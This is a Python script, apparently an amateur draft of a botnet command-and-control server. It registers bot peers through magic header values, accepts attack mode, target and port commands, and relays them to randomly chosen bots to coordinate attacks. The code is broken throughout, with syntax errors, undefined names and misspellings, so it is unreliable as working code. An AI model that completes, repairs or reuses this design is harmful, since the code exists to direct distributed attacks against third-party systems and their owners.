#This is C&C server
#Author: Sean
#Contact: not provide
#Usage: Run in background
import os
import sys
import time
import socket
from threading import Thread
import struct
import random
MAXNUM = 12000
MINNUM = 1
THREAD = 400
SERVER = []
SERVER CHECK = []
BUFF = [] #temp area
ONLINE = []
COUNT = 0
class main(Thread):
    def __init__(self):
        global master
        master = None
        Thread.__init__(self)
    def init(self):
        self.sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    def run(self):
        while 1:
            if len(SERVER) != MAXNUM and len(ZOMBIES) != MAXNUM and master != None:
                self.sock.bind(('127.0.0.1',8898))
                self.sock.listen(1)
                self.s,a = self.sock.accept()
                resp = self.s.recv(4096)
                if resp = struct.pack('<I',0x1211):
                    SERVER.append(self.s.getpeername())
                elif master != None:
                    if resp == struct.pack('<I',0x1284):
                        master = self.sock.getpeername()
                    else:
                        pass
                else:                
                   self.s.close()
                   self.sock.close()
                   self.init()
            else:
                self.sock.close()
                break
        while 1:
            init()
            self.sock.bind(('127.0.0.1',8898))
            self.sock.listen(1)
            self.report,address = self.sock.accept()
            command = self.report.recv(4096)
            if command.decode().startswith('attack?mode='):
                mode = command.decode()[len('attack?mode='):]
                self.report.send('Attack Mode >> %s'%(mode).encode())
            elif command.decode().startswith('attack?target='):
                target = command.decode()[len('attack?target='):]
                self.report.send('Attack Target >> %s'%(target).encode())
            elif command.decode().startswith('attack?port='):
                port = command.decode()[len('attack?port='):]
                self.report.send('Attack port >> %s'%(str(port)).encode())
            else:
                self.report.send('Wrong Input'.encode())
            self.report.send('Sending command and Information')
            self.messanger = socket.socket()
            HEADER_START = struct.pack('<I',0x1822)
            HEADER_AND = struct.pack('<I',0x1289)
            address = random.choice(SERVER)
            self.messanger.connect((address,8898))
            self.send(HEADER_START)
            self.send('Target %s'%(target).encode())
            self.send('mode %s'%(mode).encode())
            self.send('Port %d'%(port).encode())
            self.send(HEADER_AND)
            del ln[ln.index(adress)]
            SERVER_CHECK.append(adress)
            class report_(Thread):
                def __init__(self):
                    Thread.__init__(self)
                def run(self)
                    self.reports = socket.socke()
                    self.reports.bind(('127.0.0.1',8897))
                    self.reports.listen(len(SERVER_CHECK))
                    while COUNT == len(SERVER_CHECK)
                        f,a=self.reports.accept()
                        ONLINE.append((f,a))
                        COUNT += 1
                    


                
            
            

            